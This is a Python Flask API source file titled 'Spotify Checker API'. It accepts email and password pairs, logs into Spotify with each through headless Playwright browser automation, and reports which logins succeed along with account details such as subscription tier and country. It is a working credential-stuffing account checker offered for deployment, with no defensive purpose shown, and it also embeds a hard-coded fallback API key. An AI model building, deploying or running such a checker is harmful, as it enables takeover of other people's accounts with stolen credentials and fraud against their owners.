
#!/usr/bin/env python3
"""
SPOTIFY CHECKER API FOR RENDER.COM
Uses Playwright browser automation for reliable Spotify login
DO NOT CONFUSE WITH LOCAL CHECKER - THIS GOES ON RENDER!
"""

from flask import Flask, request, jsonify
import os
import time
from functools import wraps
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

app = Flask(__name__)

# Configuration from environment
API_KEY = os.environ.get('API_KEY', 'sk_live_abc123xyz7898724352678')
RATE_LIMIT = 100
request_counts = {}

def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != API_KEY:
            return jsonify({'success': False, 'error': 'Invalid API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

def rate_limit_check(ip):
    current_minute = int(time.time() / 60)
    key = f"{ip}:{current_minute}"
    if key in request_counts:
        if request_counts[key] >= RATE_LIMIT:
            return False
        request_counts[key] += 1
    else:
        request_counts[key] = 1
    for k in list(request_counts.keys()):
        if not k.endswith(str(current_minute)):
            del request_counts[k]
    return True

class SpotifyChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password

    def check(self):
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=True,
                    args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
                )
                context = browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                )
                page = context.new_page()

                # Go to Spotify login
                page.goto('https://accounts.spotify.com/en/login', timeout=30000)
                page.wait_for_load_state('networkidle', timeout=10000)

                # Fill credentials
                page.fill('input[id="login-username"]', self.email)
                page.fill('input[id="login-password"]', self.password)
                page.click('button[id="login-button"]')

                # Wait for navigation
                time.sleep(4)
                current_url = page.url

                # Check if still on login page (failed)
                if 'login' in current_url:
                    browser.close()
                    return {'success': False, 'error': 'Invalid credentials'}

                # Success - get account info
                try:
                    page.goto('https://www.spotify.com/api/account/v1/datalayer/', timeout=15000)
                    page.wait_for_load_state('networkidle', timeout=10000)

                    import json
                    data_text = page.locator('pre').inner_text()
                    account_data = json.loads(data_text)
                    user = account_data.get('user', {})

                    browser.close()
                    return {
                        'success': True,
                        'email': self.email,
                        'account_info': {
                            'email': user.get('email', self.email),
                            'display_name': user.get('display_name', 'N/A'),
                            'country': user.get('country', 'N/A'),
                            'product': user.get('product', 'free'),
                            'username': user.get('username', 'N/A')
                        }
                    }
                except:
                    browser.close()
                    return {
                        'success': True,
                        'email': self.email,
                        'account_info': {
                            'email': self.email,
                            'display_name': 'N/A',
                            'country': 'N/A',
                            'product': 'unknown'
                        }
                    }
        except Exception as e:
            return {'success': False, 'error': f'Browser error: {str(e)}'}

@app.route('/')
def index():
    return jsonify({
        'name': 'Spotify Checker API',
        'version': '2.0',
        'status': 'online',
        'method': 'Browser automation (Playwright)',
        'endpoints': {'/check': 'POST', '/health': 'GET'}
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': time.time()})

@app.route('/check', methods=['POST'])
@require_api_key
def check_account():
    ip = request.remote_addr
    if not rate_limit_check(ip):
        return jsonify({'success': False, 'error': 'Rate limit exceeded'}), 429

    data = request.json
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'}), 400

    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({'success': False, 'error': 'Email and password required'}), 400

    checker = SpotifyChecker(email, password)
    result = checker.check()
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Spotify Checker API (Playwright) running on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
